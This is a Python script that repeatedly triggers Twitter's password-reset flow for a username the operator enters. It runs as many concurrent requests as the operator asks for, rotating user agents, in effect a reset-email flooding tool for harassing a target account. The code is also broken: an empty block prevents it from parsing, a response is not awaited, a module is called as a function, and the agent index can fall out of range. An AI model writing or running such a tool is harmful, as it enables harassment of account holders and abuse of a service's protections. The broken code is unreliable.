import asyncio
import aiohttp
import re
import random
import tqdm

async def send_email(username, proxy, useragent):



    async with aiohttp.ClientSession() as session:
        async with session.get(
            "https://twitter.com/account/begin_password_reset",
            headers={
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "X-Push-State-Request": "true",
                "X-Requested-With": "XMLHttpRequest",
                "X-Twitter-Active-User": "yes",
                "User-Agent": useragent,
                "X-Asset-Version": "5bced1",
                "Referer": "https://twitter.com/login",
                "Accept-Encoding": "gzip, deflate",
                "Accept-Language": "en-US,en;q=0.9"
                }) as res_begin:
            
            authenticity_token = ""
            regex_output = re.search(r'authenticity_token.+value="(\w+)">', res_begin.text)
            if regex_output and regex_output.group(1):
                authenticity_token = regex_output.group(1)
                print("[*] Password Reset Protection is disabled.")

                async with session.post(
                    "https://twitter.com/account/begin_password_reset",
                    headers={
                        "Cache-Control": "max-age=0",
                        "Origin": "https://twitter.com",
                        "Upgrade-Insecure-Requests": "1",
                        "Content-Type": "application/x-www-form-urlencoded",
                        "User-Agent": useragent,
                        "Accept":
                        "text/html,application/xhtml+xml,application/xml;q=0.9,"
                        "image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
                        "Referer": "https://twitter.com/account/begin_password_reset",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept-Language": "en-US,en;q=0.9"
                    },data="authenticity_token=" + authenticity_token +
                    "&account_identifier=" + username) as res_send:



                
            else:
                print("[!] Password Reset Protection is enabled.")
                return "[!] Error: Request Failed..."

async def main():

    user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
    "Opera/9.80 (J2ME/MIDP; Opera Mini/7.1.32052/29.3417; U; en) Presto/2.8.119 Version/11.10",
    "Mozilla/5.0 (Windows NT 5.1; rv:34.0) Gecko/20100101 Firefox/34.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/603.3.8 "
    "(KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) "
    "Version/11.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36"]

    username = input("[?] Please enter username : ")
    num = int(input("[?] Please enter num: "))

    proxy = ""

    tasks_list = []

    for n in range(num):
        tasks_list.append(asyncio.create_task( send_email(username, proxy, user_agents[random.randint(0,9)]) ))

    for f in tqdm(asyncio.as_completed(tasks_list)):
        result = await f
        print(result)


if __name__ == '__main__':
    asyncio.run(main())